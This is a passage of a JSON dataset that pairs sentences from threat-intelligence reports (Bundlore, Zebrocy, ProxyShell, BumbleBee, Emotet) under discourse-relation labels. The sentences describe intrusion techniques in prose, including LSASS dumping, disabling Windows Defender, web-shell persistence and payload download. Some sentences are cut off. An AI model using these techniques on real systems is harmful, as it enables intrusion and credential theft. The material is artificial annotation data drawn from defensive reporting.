        "S1": "- Downloads additional components to the temporary directory mmtmp=\u201d/private/tmp/.mmupdatescripts_$(date +%Y%m%d%H%M%S)\u201d (outlined in the table below)",
        "S2": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "relation": "MISC"
    },
    {
        "S1": "This script runs daily to check for updates, and will download and install additional software if offered by the update server, as discussed below.",
        "S2": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "relation": "ELABORATION"
    },
    {
        "S1": "File Name Application Description pwr.zip mm-install-macos.app Main Bundlore app wt.zip webtools.app Webtools Application imsearch.tar.gz",
        "S2": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "relation": "MISC"
    },
    {
        "S1": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "S2": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "relation": "NEXT"
    },
    {
        "S1": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "S2": "In both this Bundlore and the Crossrider samples, the configuration profile was named AdminPrefs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "S2": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "S2": "On the analyzed system configured with Chrome as the default browser, the malware installed a profile that sets the home page, search provider, and new tab default page.",
        "relation": "MISC"
    },
    {
        "S1": "In both this Bundlore and the Crossrider samples, the configuration profile was named AdminPrefs.",
        "S2": "For example, the script originally downloads an \u201cAdminPrefs\u201d configuration profile template (also seen in the post referenced above) which it dynamically populates with system-specific information on the victim machine.",
        "relation": "MISC"
    },
    {
        "S1": "However, the malicious actors could easily change this name at any time by pushing a new installation script during the daily update check.",
        "S2": "This allows the malware authors to dynamically change the malware installed on the system, which is all installed with root permissions due to the configuration during initial setup.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, the script originally downloads an \u201cAdminPrefs\u201d configuration profile template (also seen in the post referenced above) which it dynamically populates with system-specific information on the victim machine.",
        "S2": "Below is a sample of the analyzed script which shows the download and population of the profile template.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script is configured to install different products depending on what is retrieved from the server.",
        "S2": "Interestingly, this installer sets the dock to \u201chidden\u201d mode during install and all of the desktop items disappear while it is running as seen in the screenshot below.",
        "relation": "MISC"
    },
    {
        "S1": "Below is a sample of the analyzed script which shows the download and population of the profile template.",
        "S2": "In blue, the script replaces the fields in the profile template with the custom parameters, and then installs the custom profile as seen in green.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the analyzed system configured with Chrome as the default browser, the malware installed a profile that sets the home page, search provider, and new tab default page.",
        "S2": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "S2": "When this installer script was run again a week after the initial infection, two additional components were installed \u2013 macOSOTA and Periodikal, which appear to be additional Bundlore samples (not covered here, but may be analyzed for a future blog post).",
        "relation": "NEXT"
    },
    {
        "S1": "According to Chrome documentation:",
        "S2": "The installed MyCouponsmart extension can be seen in the Chrome extension management page:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, this installer sets the dock to \u201chidden\u201d mode during install and all of the desktop items disappear while it is running as seen in the screenshot below.",
        "S2": "Although this variant of Bundlore is not significantly different than others seen over the last year, the additional features of manipulating the sudoers file and installation of Configuration Profiles are less commonly seen.",
        "relation": "MISC"
    },
    {
        "S1": "When this installer script was run again a week after the initial infection, two additional components were installed \u2013 macOSOTA and Periodikal, which appear to be additional Bundlore samples (not covered here, but may be analyzed for a future blog post).",
        "S2": "Although this variant of Bundlore is not significantly different than others seen over the last year, the additional features of manipulating the sudoers file and installation of Configuration Profiles are less commonly seen.",
        "relation": "MISC"
    },
    {
        "S1": "The main takeaway however is that adware is often dismissed, but samples like the Bundlore variant analyzed in this post are able to install anything as root without any notification to the user after initial authentication.",
        "S2": "Existing customers can learn more about how VMware Carbon Black products protect against this variant of Bundlore by visiting our \u201cBundlore (macOS) mm-install-macos\u201d TAU-TIN hosted on the User Exchange.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At the end of August 2018, the Sednit group launched a spearphishing email campaign where it distributed shortened URLs that delivered the first stage of Zebrocy components.",
        "S2": "Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain.",
        "S2": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "relation": "NEXT"
    },
    {
        "S1": "About 20 clicks were recorded on this link in the same week that the URL was created, and these presumably downloaded the target archive.",
        "S2": "The archive contains two files; the first is an executable file, while the second is a decoy PDF document.",
        "relation": "NEXT"
    },
    {
        "S1": "The archive contains two files; the first is an executable file, while the second is a decoy PDF document.",
        "S2": "The result of the password validation will always be wrong, but after the apparent validation attempt, the decoy PDF document is opened.",
        "relation": "NEXT"
    },
    {
        "S1": "That document appears to be empty, but the downloader, which is written in Delphi, continues running in the background.",
        "S2": "It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.",
        "relation": "NEXT"
    },
    {
        "S1": "Once again this downloader is as straightforward as the Zebrocy gang\u2019s other downloaders.",
        "S2": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "relation": "MISC"
    },
    {
        "S1": "It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "S2": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "relation": "MISC"
    },
    {
        "S1": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": "MISC"
    },
    {
        "S1": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "S2": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "relation": "MISC"
    },
    {
        "S1": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Hence, the time between the victim running the downloader and the operators\u2019 first commands",
        "S2": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "relation": "MISC"
    },
    {
        "S1": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "S2": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "S2": "The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The commands available are located in one of the configuration blobs mentioned earlier (the \u201ccommands\u201d blob in Figure 3).",
        "S2": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty.",
        "S2": "Moreover, the backdoor contains a list of filenames related to credentials from software listed below (database names):",
        "relation": "MISC"
    },
    {
        "S1": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "S2": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "relation": "MISC"
    },
    {
        "S1": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "S2": "The commands above are commonly executed when the operators first connect to a newly activated backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They don\u2019t have any arguments, and they are quite self-explanatory.",
        "S2": "In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims\u2019 machines.",
        "relation": "MISC"
    },
    {
        "S1": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "S2": "In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims\u2019 machines.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The current dumpers have some similarities with those previously used by the group.",
        "S2": "The operators take care of retrieving these databases if they are present on the victim\u2019s computer.",
        "relation": "MISC"
    },
    {
        "S1": "The current dumpers have some similarities with those previously used by the group.",
        "S2": "These dumpers create log files indicating the presence or absence of potential databases to dump:",
        "relation": "ELABORATION"
    },
    {
        "S1": "These dumpers create log files indicating the presence or absence of potential databases to dump:",
        "S2": "These dumpers are quickly removed once they have done their job.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally, depending on how interesting the victim is, they malware operators may deploy another custom backdoor.",
        "S2": "First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours.",
        "relation": "NEXT"
    },
    {
        "S1": "This backdoor is executed using the CMD_EXECUTE command:",
        "S2": "First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours.",
        "relation": "NEXT"
    },
    {
        "S1": "Second, the hex-encoded string is the C&C used by the custom backdoor while in the Delphi backdoor the C&C is embedded in the configuration.",
        "S2": "Once again, it\u2019s not very clear what the purpose of this custom backdoor is.",
        "relation": "MISC"
    },
    {
        "S1": "Once again, it\u2019s not very clear what the purpose of this custom backdoor is.",
        "S2": "The very short timeframe where this backdoor is on the system and operating makes it harder to retrieve.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with our previous case, they started by uploading their web shell and disabling antivirus services.",
        "S2": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
        "relation": "MISC"
    },
    {
        "S1": "Soon after, they established two persistence methods.",
        "S2": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
        "S2": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "relation": "MISC"
    },
    {
        "S1": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
        "S2": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
        "relation": "MISC"
    },
    {
        "S1": "At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.",
        "S2": "Two days later, we saw the threat actors reappear.",
        "relation": "NEXT"
    },
    {
        "S1": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "S2": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:",
        "relation": "MISC"
    },
    {
        "S1": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "S2": "This activity then repeated approximately 2 days after the initial exploitation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "No further activity was observed as the threat actors were evicted from the network.",
        "S2": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
        "relation": "MISC"
    },
    {
        "S1": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:",
        "S2": "Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:",
        "relation": "ELABORATION"
    },
    {
        "S1": "With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.",
        "S2": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "relation": "MISC"
    },
    {
        "S1": "With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.",
        "S2": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension.",
        "S2": "In an attempt to hide the actions taken, the actor removes the request just created:",
        "relation": "NEXT"
    },
    {
        "S1": "In an attempt to hide the actions taken, the actor removes the request just created:",
        "S2": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "relation": "MISC"
    },
    {
        "S1": "This activity then repeated approximately 2 days after the initial exploitation.",
        "S2": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "S2": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "relation": "MISC"
    },
    {
        "S1": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "S2": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "S2": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "S2": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "S2": "This file also matches on an additional Yara rule more recently \u2013 APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "S2": "Below, we can observe the content of wininet.xml:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.",
        "S2": "Wininet.bat simply loops through the execution of the file dllhost.exe .",
        "relation": "MISC"
    },
    {
        "S1": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.",
        "S2": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
        "S2": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.",
        "S2": "The first thing they did was make a new user named DefaultAccount with the password [email protected] .",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the first activity, we observed the use of user.exe executable that ran the following PowerShell command:",
        "S2": "The threat actors ran the same command again two days later:",
        "relation": "NEXT"
    },
    {
        "S1": "They then activated the account and changed the password ( [email protected] ) for the second time.",
        "S2": "The threat actors ran the same command again two days later:",
        "relation": "NEXT"
    },
    {
        "S1": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "S2": "The threat actor enabled WDigest authentication.",
        "relation": "MISC"
    },
    {
        "S1": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "S2": "Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "S2": "The following commands where then ran to initiate the task and to achieve persistence:",
        "relation": "ELABORATION"
    },
    {
        "S1": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "S2": "The scheduled task created by the web shell was set to use",
        "relation": "ELABORATION"
    },
    {
        "S1": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "S2": "Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "The scheduled task created by the web shell was set to use",
        "S2": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
        "S2": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor enabled WDigest authentication.",
        "S2": "The threat actor created a process memory dump from LSASS.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "In this case they created a \u201cminidump\u201d using the LOLBIN comsvcs.dll.",
        "S2": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.",
        "relation": "MISC"
    },
    {
        "S1": "They executed commands such as:",
        "S2": "They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.",
        "S2": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "relation": "MISC"
    },
    {
        "S1": "Additionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command.",
        "S2": "While having access to the Exchange server, we observed no attempts to export or access user mailboxes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.",
        "S2": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "relation": "MISC"
    },
    {
        "S1": "The intrusion began with the delivery of an ISO file containing a LNK file and a BumbleBee payload in the form of a hidden DLL file.",
        "S2": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actor displayed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Around 15 minutes after the execution of BumbleBee, multiple processes were spawned with the goal of injecting Meterpreter into each of them.",
        "S2": "BumbleBee executed under a user with local administrator privileges on all workstations in the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After the threat actors gained access with Meterpreter, they began conducting reconnaissance on the workstation and network, including querying domain controllers, mapping domain joined computers, enumerating Active Directory trusts, and listing Domain Admin accounts.",
        "S2": "Next, the threat actors moved laterally via RDP to a server.",
        "relation": "NEXT"
    },
    {
        "S1": "At around six hours after initial execution, we observed a new process created that was then used to host a Cobalt Strike beacon, from the same command and control server observed in a prior BumbleBee case.",
        "S2": "The BumbleBee malware has been following the trend of using the effective combination of utilizing an .iso image containing a .lnk and .dll file.",
        "relation": "MISC"
    },
    {
        "S1": "At around six hours after initial execution, we observed a new process created that was then used to host a Cobalt Strike beacon, from the same command and control server observed in a prior BumbleBee case.",
        "S2": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actor displayed.",
        "relation": "MISC"
    },
    {
        "S1": "This beacon reprised discovery activity, but also cut a common command short net user /dom instead of /domain , whether from keyboard laziness or a trick to trip-up detections.",
        "S2": "A second round of enumeration was observed on the beachhead using AdFind, which was executed via the Cobalt Strike beacon on the system.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then used their access to execute procdump via a remote service creation with the intention of dumping credentials from LSASS from an adjacent workstation on the network.",
        "S2": "Through the AnyDesk session, the threat actor was observed connecting to a file share and accessing multiple documents related to cyber insurance and spreadsheets with passwords.",
        "relation": "MISC"
    },
    {
        "S1": "Next, the threat actors moved laterally via RDP to a server.",
        "S2": "From the backup system, the threat actors also opened internet explorer and attempted to load the environment\u2019s mail server, likely checking for Outlook Web Access.",
        "relation": "MISC"
    },
    {
        "S1": "Through the AnyDesk session, the threat actor was observed connecting to a file share and accessing multiple documents related to cyber insurance and spreadsheets with passwords.",
        "S2": "Following this second round of enumeration, the threat actor moved latterly to a server hosting backups, via RDP and interacted with the backup console.",
        "relation": "NEXT"
    },
    {
        "S1": "Following this second round of enumeration, the threat actor moved latterly to a server hosting backups, via RDP and interacted with the backup console.",
        "S2": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actor displayed.",
        "relation": "MISC"
    },
    {
        "S1": "From the backup system, the threat actors also opened internet explorer and attempted to load the environment\u2019s mail server, likely checking for Outlook Web Access.",
        "S2": "Following this third round of enumeration the threat actors were evicted from the environment and no further impact was observed.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actor displayed.",
        "S2": "The threat actor was observed moving via RDP throughout the network with a Domain Admin account.",
        "relation": "MISC"
    },
    {
        "S1": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actor displayed.",
        "S2": "We have observed the same behavior with other major malware distributors in previous reports:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The BumbleBee malware has been following the trend of using the effective combination of utilizing an .iso image containing a .lnk and .dll file.",
        "S2": "As noted in previous reports, the .dll is hidden from the user unless they display hidden items in explorer like so:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The BumbleBee malware has been following the trend of using the effective combination of utilizing an .iso image containing a .lnk and .dll file.",
        "S2": "When the .lnk was doubled clicked by the user, the BumbleBee malware tamirlan.dll was executed:",
        "relation": "NEXT"
    },
    {
        "S1": "The BumbleBee malware has been following the trend of using the effective combination of utilizing an .iso image containing a .lnk and .dll file.",
        "S2": "Upon clicking the LNK file the BumbleBee payload was executed.",
        "relation": "NEXT"
    },
    {
        "S1": "Using the event log, \u201cMicrosoft-Windows-VHDMP-Operational.evtx\u201d, we can quickly find when the user mounted the .iso.",
        "S2": "Following the user mounting the .iso file, they clicked on a .lnk file documents.lnk .",
        "relation": "NEXT"
    },
    {
        "S1": "Upon clicking the LNK file the BumbleBee payload was executed.",
        "S2": "The .lnk contains instructions to execute a specific exported function with the BumbleBee DLL file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Following the user mounting the .iso file, they clicked on a .lnk file documents.lnk .",
        "S2": "The .lnk contains instructions to execute a specific exported function with the BumbleBee DLL file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As noted in previous reports, the .dll is hidden from the user unless they display hidden items in explorer like so:",
        "S2": "When the .lnk was doubled clicked by the user, the BumbleBee malware tamirlan.dll was executed:",
        "relation": "MISC"
    },
    {
        "S1": "When the .lnk was doubled clicked by the user, the BumbleBee malware tamirlan.dll was executed:",
        "S2": "The BumbleBee loader uses WMI to start new process by calling COM functions to create a new process.",
        "relation": "NEXT"
    },
    {
        "S1": "Approximately 5 seconds after execution, the rundll32.exe process contacted the IP 154.56.0.221 .",
        "S2": "In this intrusion, an instance of C:\\Program Files\\Windows Photo Viewer\\ImagingDevices.exe was created and accessed by the BumbleBee rundll32.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "More information on this traffic is covered in the Command and Control section below.",
        "S2": "As detailed in the Execution section, the use of WMI to spawn new processes is a known technique to evade any parent/child process heuristics or detections.",
        "relation": "MISC"
    },
    {
        "S1": "The BumbleBee loader uses WMI to start new process by calling COM functions to create a new process.",
        "S2": "This resulted in new processes not being a child of BumbleBee, but rather WmiPrvSE.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The BumbleBee loader uses WMI to start new process by calling COM functions to create a new process.",
        "S2": "Analysis of the loader found that a function of the malware chooses 1 of 3 target processes before injecting the supplied code:",
        "relation": "NEXT"
    },
    {
        "S1": "Below you can see the COM instance creation followed by defining the WMI namespace and WMI object being created \u2013 \u201cWin32_Process\u201d.",
        "S2": "As detailed in the Execution section, the use of WMI to spawn new processes is a known technique to evade any parent/child process heuristics or detections.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Analysis of the loader found that a function of the malware chooses 1 of 3 target processes before injecting the supplied code:",
        "S2": "The pivot to using Cobalt Strike began around 6 hours after the execution of the BumbleBee loader.",
        "relation": "NEXT"
    },
    {
        "S1": "In this intrusion, an instance of C:\\Program Files\\Windows Photo Viewer\\ImagingDevices.exe was created and accessed by the BumbleBee rundll32.exe process.",
        "S2": "The pivot to using Cobalt Strike began around 6 hours after the execution of the BumbleBee loader.",
        "relation": "NEXT"
    },
    {
        "S1": "The pivot to using Cobalt Strike began around 6 hours after the execution of the BumbleBee loader.",
        "S2": "The BumbleBee loader itself uses several defense evasion and anti-analysis techniques.",
        "relation": "MISC"
    },
    {
        "S1": "The BumbleBee loader itself uses several defense evasion and anti-analysis techniques.",
        "S2": "Once the malware is unpacked, it becomes quite apparent to what the malware author(s) were looking for\u2013",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once the malware is unpacked, it becomes quite apparent to what the malware author(s) were looking for\u2013",
        "S2": "Create Remote Thread \u2013 The malware used the win32 function CreateRemoteThread in order to execute code in rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "A remote service was created on one of the workstations in order to dump lsass.",
        "S2": "The lsass dump file ran remotely, was copied to the beachhead through the admin share C$.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As mentioned in Credential Access, the threat actor used remote services to execute commands on remote hosts.",
        "S2": "The threat actor accessed multiple documents and folders from a remote file server.",
        "relation": "MISC"
    },
    {
        "S1": "SMB was used to transfer the various tools laterally, as needed in the environment, like procdump.exe and AnyDesk executables.",
        "S2": "The SMB share was accessed through a compromised server via an AnyDesk session.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The SMB share was accessed through a compromised server via an AnyDesk session.",
        "S2": "AnyDesk was installed to facilitate interactive desktop command and control access to a server in the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This C2 server was observed in a previous BumbleBee case.",
        "S2": "This was again the same IP observered in the prior Bumblebee case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reviewing the ad_svc.trace logs from Anydesk located in %programdata%\\AnyDesk reveal the logins originating from 108.177.235.25.",
        "S2": "The Client-ID observed in the logs was 892647610",
        "relation": "MISC"
    },
    {
        "S1": "Back in May, we witnessed an intrusion that started from a phishing email which included Emotet.",
        "S2": "The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.",
        "relation": "NEXT"
    },
    {
        "S1": "The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.",
        "S2": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "relation": "MISC"
    },
    {
        "S1": "The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.",
        "S2": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.",
        "S2": "Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign.",
        "S2": "This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "S2": "This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "S2": "During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "S2": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "S2": "Pass-the-Hash behavior was observed targeting several accounts on the lateral host.",
        "relation": "NEXT"
    },
    {
        "S1": "Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.",
